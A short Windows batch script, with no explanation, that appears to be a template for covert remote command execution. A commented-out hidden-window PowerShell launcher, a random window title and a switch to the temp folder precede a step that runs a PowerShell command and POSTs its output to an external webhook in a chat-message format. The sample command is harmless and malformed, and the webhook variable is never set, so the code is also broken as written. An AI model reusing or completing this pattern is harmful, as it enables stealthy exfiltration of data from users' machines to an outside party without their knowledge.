@echo off
::powershell.exe -windowstyle Hidden -command
title z%random%
cd %temp%

:Commands
for /f %%a in ('powershell Invoke-RestMethod echo hello world') do set a=%%a
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%a%```\"}" %webhook%
pause
